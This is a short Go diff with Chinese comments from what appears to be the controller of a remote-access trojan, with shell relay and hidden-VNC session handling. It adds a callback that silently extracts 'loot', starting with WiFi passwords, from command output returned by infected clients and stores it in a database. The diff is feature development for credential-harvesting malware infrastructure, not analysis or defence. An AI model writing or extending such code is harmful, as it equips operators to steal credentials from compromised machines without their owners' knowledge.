@@ -15,6 +15,10 @@ import (
 // 原实现三份近 400 行重复 switch 各自维护，易产生漂移（如 shell 追加写法、日志级别不一致）；
 // 合并于此，数据日志统一 Debugf（默认 Info 级不输出，避免每消息刷屏）。
 // xtermBroadcast / hvncBroadcast 为会话广播回调（由 api 包注入，nil 时跳过）。
+// LootIngestFunc 命令产出识别回调（由 main 注入 api.IngestLootFromOutput）。
+// 放在 pkg/command 而不是直接调用 pkg/api：pkg/api 依赖 pkg/command，反向调用会成环。
+var LootIngestFunc func(uid, output string)
+
 func HandleClientReply(listenerType, uid string, replyType uint32, data []byte,
 	xtermBroadcast func(uid string, data []byte),
 	hvncBroadcast func(uid, sid string, frame []byte)) error {
@@ -60,6 +64,11 @@ func HandleClientReply(listenerType, uid string, replyType uint32, data []byte,
 			}
 			// 【优化】SQL 增量追加，免去"读整 blob → 追加 → 写回"的 IO 放大
 			database.AppendShellContent(uid, string(utf8Data)+"\n")
+			// 命令产出自动入库（V1：WiFi 密码）。识别逻辑在 pkg/api，经回调注入；
+			// 回调内部按客户端输出标记识别并静默失败，不影响回包主链路。
+			if LootIngestFunc != nil {
+				LootIngestFunc(uid, string(utf8Data))
+			}
 		}
 	case PS:
 		// 转换编码以解决中文乱码问题
